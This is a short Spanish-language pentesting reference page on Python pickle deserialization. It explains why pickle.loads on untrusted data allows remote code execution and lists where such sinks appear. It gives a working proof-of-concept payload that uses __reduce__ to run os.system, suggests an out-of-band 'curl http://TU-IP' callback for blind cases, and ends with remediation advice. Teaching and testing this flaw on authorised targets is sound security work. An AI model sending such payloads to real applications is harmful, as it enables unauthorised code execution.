# Deserialización — Python (pickle)

Ver índice: [deserializacion.md](deserializacion.md). **Solo sobre objetivos autorizados.**

## Por qué es peligroso

`pickle.loads()` sobre datos no confiables es RCE directa: pickle puede reconstruir objetos ejecutando código vía `__reduce__`.

## PoC de payload

```python
import pickle, os, base64
class E:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
Envía ese base64 donde la app haga `pickle.loads(base64.b64decode(...))`.

## Dónde aparece

- Cookies/tokens que la app deserializa con pickle.
- Caches, colas o ficheros `.pkl` con origen en el usuario.
- Formatos que por debajo usan pickle.

## Notas

- Para blind, usa un comando OOB (`curl http://TU-IP`) en vez de leer salida.
- Mismo riesgo en `yaml.load()` sin `SafeLoader` y en otros deserializadores.

## Remediación

- No hacer `pickle.loads()` de datos no confiables. Usar JSON.
- `yaml.safe_load()` en YAML.
